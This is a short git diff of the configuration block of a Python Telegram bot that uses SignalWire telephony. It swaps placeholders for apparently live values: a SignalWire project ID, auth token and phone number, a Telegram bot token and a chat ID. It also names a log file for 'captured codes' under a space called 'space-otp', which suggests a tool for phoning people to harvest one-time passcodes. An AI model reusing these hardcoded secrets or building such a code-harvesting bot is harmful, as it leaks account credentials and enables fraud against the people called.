@@ -11,14 +11,14 @@ from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQuer
 from signalwire.rest import Client as signalwire_client
 
 # --- CONFIGURACIÓN SIGNALWIRE ---
-SIGNALWIRE_PROJECT = 'ID_DE_TU_PROYECTO'  # Project ID
-SIGNALWIRE_TOKEN = 'PT_xxxxxxxxxxxxxx'    # Auth Token
-SIGNALWIRE_SPACE = 'tu-espacio.signalwire.com' # Space URL (nombre.signalwire.com)
-SIGNALWIRE_NUMBER = '+1XXXXXXXXXX'        # Tu número de SignalWire
+SIGNALWIRE_PROJECT = '4c37b4d6-dc54-45f4-bb1e-3e56e16ab9b5'  # Project ID
+SIGNALWIRE_TOKEN = 'PT81230d7283847f875cb9afddb579e62135baaee2d045ace1'    # Auth Token
+SIGNALWIRE_SPACE = 'space-otp.signalwire.com' # Space URL (nombre.signalwire.com)
+SIGNALWIRE_NUMBER = '+18778273701'        # Tu número de SignalWire
 
 # --- CONFIGURACIÓN TELEGRAM ---
 TELEGRAM_TOKEN = '8555237773:AAHZiG_nqBzGyWshGsXBzCEKnOKmOjxoHLw'
-MI_CHAT_ID = "TU_CHAT_ID_AQUI" 
+MI_CHAT_ID = "6280594821" 
 ARCHIVO_LOGS = "codigos_capturados.txt"
 
 # Inicialización de Clientes
